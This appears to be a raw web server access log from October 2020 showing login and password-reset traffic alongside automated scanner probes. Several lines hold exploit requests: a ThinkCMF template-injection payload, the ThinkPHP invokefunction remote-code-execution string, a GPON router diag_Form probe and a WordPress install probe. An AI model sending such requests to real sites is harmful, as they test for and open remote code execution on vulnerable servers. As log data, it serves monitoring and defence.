173.245.52.198 - - [03/Oct/2020:03:09:26 +0000] "GET /login HTTP/1.1" 200 3952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.198 - - [03/Oct/2020:03:09:51 +0000] "GET /password/reset HTTP/1.1" 200 2990 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.198 - - [03/Oct/2020:03:10:06 +0000] "GET /login HTTP/1.1" 200 3952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
173.245.52.198 - - [03/Oct/2020:03:10:16 +0000] "GET /password/reset HTTP/1.1" 200 2990 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
176.113.115.214 - - [03/Oct/2020:03:20:48 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 27220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
108.162.219.205 - - [03/Oct/2020:03:22:17 +0000] "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 1118 "-" "Apache/2.4.34 (Ubuntu) OpenSSL/1.1.1 (internal dummy connection)"
202.83.45.80 - - [03/Oct/2020:03:25:51 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1118 "-" "Hello, World"
176.113.115.214 - - [03/Oct/2020:03:34:08 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 200 27520 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
173.245.52.198 - - [03/Oct/2020:03:35:13 +0000] "GET / HTTP/1.1" 200 27291 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
